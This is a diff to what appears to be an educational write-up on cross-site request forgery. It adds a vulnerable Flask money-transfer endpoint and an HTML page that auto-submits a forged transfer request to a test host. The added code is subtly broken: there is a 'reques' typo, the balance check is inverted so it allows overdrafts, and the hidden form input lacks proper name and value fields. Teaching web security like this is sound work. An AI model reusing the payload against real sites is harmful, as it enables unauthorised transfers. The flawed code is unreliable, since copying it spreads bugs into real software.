@@ -17,6 +17,39 @@ A threat actor may trick an authenticated or trusted victim into transmitting un
 5. bob clicks on the malicious website
 6. bob's browser loads the session cookie and performs a fund transfer
 
+## Code
+#### Target Logic
+```py
+...
+@app.route("/send_money", methods=["POST"])
+@login_required
+def send_money():
+   ...
+   amount = int(request.form.get("amount"))
+   to_user = get_user(int(reques.form.get("to")))
+   if current_user:
+      if current_user['balance'] <= amount:
+         current_user['balance'] -= amount
+         to_user['balance'] += amount
+         return make_response({"transfer":"success"}, 200)
+   return make_response({"transfer":"failed"}, 200)
+...
+```
+
+#### Victim Executes
+```html
+<html>
+  <body>
+    <form action="https://test.local/send_money" method="POST">
+      <input type="hidden" amount="1000" to="9999"/>
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+```
+
 ## Impact
 Vary
 
